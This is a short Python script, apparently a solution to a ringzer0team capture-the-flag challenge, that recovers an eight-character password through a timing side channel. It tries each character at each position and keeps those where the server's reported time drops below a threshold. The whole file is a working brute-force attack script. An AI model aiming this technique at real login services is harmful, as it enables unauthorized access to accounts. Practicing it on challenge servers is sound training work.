import re
import socket
import time

BUFFER_SIZE = 1024
CHARSET = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`!@#$%^&*()-=_+~"

def main():
    answer = ''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('ringzer0team.com', 60000))

    for i in range(0,8):
        for c in CHARSET:
            password = '#' * i + c + '#' * (7 - i)
            s.send('%s\n' %password)
            time.sleep(0.1)
            data = s.recv(BUFFER_SIZE)
            timing = float(re.search('Server take (\S+) seconds', data).groups(1)[0])
            if timing < 0.008:
                answer = answer + c

    print answer

if __name__ == '__main__':
    main()
